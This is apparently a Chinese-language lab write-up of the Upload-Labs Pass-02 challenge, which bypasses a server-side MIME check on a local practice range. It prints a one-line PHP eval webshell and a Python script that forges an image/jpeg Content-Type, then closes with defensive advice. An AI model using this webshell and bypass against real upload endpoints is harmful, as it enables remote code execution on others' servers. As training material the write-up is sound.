Upload-Labs Pass-02

2026年9月26日 Upload-Labs Web安全 文件上传 MIME绕过

一、题目信息

  • 题目名称：Upload-Labs Pass-02 (服务端MIME检查绕过)
  • 题目平台：Upload-Labs 本地靶场
  • 题目类型：Web安全 / 文件上传漏洞 / 服务端MIME类型伪造
  • 靶场链接：http://localhost:8082/Pass-02/index.php（本地环境）
  • 涉及工具：Python (requests库)、Burp Suite (可选)

二、解题步骤

1. 分析题目考什么

本题的核心考点是服务端 MIME 类型检查绕过。Pass-02 不像 Pass-01 那样仅在前端进行 JS 校验，而是在后端 PHP 代码中检查了 $_FILES['upload_file']['type'] 字段。该字段就是 HTTP 请求头中的 Content-Type。由于浏览器会根据文件后缀自动生成 Content-Type，攻击者只需通过抓包或脚本伪造 Content-Type: image/jpeg，同时保持文件名为 .php，即可绕过检查。

2. 怎么想（破题思路）

  • 直接上传 shell.php，后端拦截并提示“本pass在服务端对数据包的MIME进行检查”。
  • 发现前端 JS 校验在 Pass-02 中不起作用，说明后端是检查者。
  • 利用 Python requests 库的 files 参数，指定文件名为 shell.php，同时指定 Content-Type 为 image/jpeg。
  • 发送请求，成功绕过 MIME 校验。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：误以为网页显示“上传失败”代表脚本失败

踩坑情况：运行 Python 脚本后，靶场网页上一直显示“上传失败”，误以为脚本没起作用。

原因分析：实际上 Python 脚本是独立发起 HTTP 请求的，它已经成功上传了木马。而网页上显示“失败”只是用户之前手动上传尝试的残留结果（或者是因为网页抓包走的是普通浏览器请求，没有经过 Python 脚本的伪装）。

改进方式：不要看网页的失败提示，直接访问木马路径 http://localhost:8082/upload/shell.php，如果返回空白页面，说明 Python 脚本已经成功。

详细实操步骤（Payload逐字解释）

第一步：准备 Webshell 和 Python 脚本

创建 shell.php 文件，内容为：

<?php @eval($_POST['cmd']); ?>

第二步：编写 Python 脚本

import requests

url = "http://localhost:8082/Pass-02/index.php"
files = {
    'upload_file': ('shell.php', open('shell.php', 'rb'), 'image/jpeg')
}
data = {'submit': 'Submit'}

response = requests.post(url, files=files, data=data)
print(response.text)

逐字解析：

  • files = {'upload_file': ('shell.php', open('shell.php', 'rb'), 'image/jpeg')}：
    • 'shell.php'：发送给服务器时告诉它文件名叫 shell.php，这样服务器保存下来就是 PHP 脚本。
    • open('shell.php', 'rb')：以二进制只读方式打开本地文件。
    • 'image/jpeg'：核心作弊点！强行告诉服务器这个文件是 JPEG 图片，骗过后端的 MIME 检查。

第三步：运行脚本与验证

终端执行 python3 upload_pass02.py，不管终端打印出什么，直接访问：

http://localhost:8082/upload/shell.php

空白页面 = WebShell 成功植入。

4. 怎么迁移（跨领域联想）

  • 信任边界（Trust Boundary）：Pass-02 让我们深刻理解了“永远不要相信客户端”这一安全铁律。HTTP 请求头的 MIME 类型是客户端可以任意伪造的，仅凭此字段判断文件类型是极其脆弱的。
  • 中间人攻击与代理：在实际网络攻击中，攻击者经常使用类似 Burp Suite 的工具充当“中间人”，截获并篡改 HTTP 请求中的数据包。这和在 Python 脚本中伪造数据包属于同一逻辑层面的操作。
  • 社交工程中的伪装：就像攻击者给恶意文件披上“图片”的外衣一样，现实中钓鱼邮件也常通过伪装发件人、修改文件后缀（如 恶意.exe.pdf）来欺骗用户。这种“表面与实质”不一致的攻击无处不在。

三、名词大全与原理深度复盘

1. MIME 类型 (Media Type)

MIME 类型是用来标识文件格式的标准。例如 image/jpeg 代表 JPEG 图片，text/php 代表 PHP 脚本。浏览器在上传文件时，会根据文件的后缀名自动为 HTTP 请求设置 Content-Type 头部。

2. Content-Type 请求头

HTTP 请求头中的一个字段，用于告诉服务器请求体的数据类型。在文件上传场景中，服务器常常依赖它来判断文件是否合法（如判断是否为图片）。

3. 服务端验证 vs 客户端验证

Pass-01 是客户端验证（JS），我们可以通过 F12 覆盖。Pass-02 是服务端验证，我们无法直接改后端逻辑，只能通过抓包修改发送的数据包来“欺骗”后端。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Pass-01 的区别：Pass-01 是前端 JS 拦截，我们通过 F12 覆盖 JS 就能过。Pass-02 是服务端 MIME 检查，必须用抓包/脚本伪造数据包才能过。
  • 与前阶段 SQLi-Labs 的区别：SQLi-Labs 攻击的是数据库，Upload-Labs 攻击的是 Web 服务器和文件系统。

2. 这种题目的出现原因（为什么存在）

许多开发者知道要检查文件类型，但错误地认为 Content-Type 是无法伪造的。他们使用了 $_FILES['file']['type'] 这种由客户端提供的值来判断，导致安全检查形同虚设。这反映了许多初级开发者在安全认知上的局限性——过于相信客户端环境。

3. 这种应用在实际中如何体现？

在现代企业级系统中，后端通常会对上传文件进行多重校验：检查文件头（Magic Bytes）、检查图片完整性（如用 getimagesize()）、重命名文件、将文件存储在非 Web 目录、甚至将文件上传到独立的对象存储（OSS）中。这一关只是最基础的入门，提醒我们“眼见不一定为实”。

4. 如何抽象理解概念（大白话）

把靶场比作一个“只看标签的安检员”：

  • Pass-01 是门口保安（前端）拦住你，你把他打晕（覆盖 JS）就能带进去。
  • Pass-02 是公司里面的安检员（后端）检查你箱子上的标签。
  • 你带的是一个炸药（PHP 脚本），但你给它贴了一个“速冻水饺（image/jpeg）”的标签。
  • 安检员只看标签，不看里面，于是放行。实际上，炸药（PHP 代码）已经在服务器内部被引爆（执行）了。

做一道题，就要往自己脑子里装点东西。
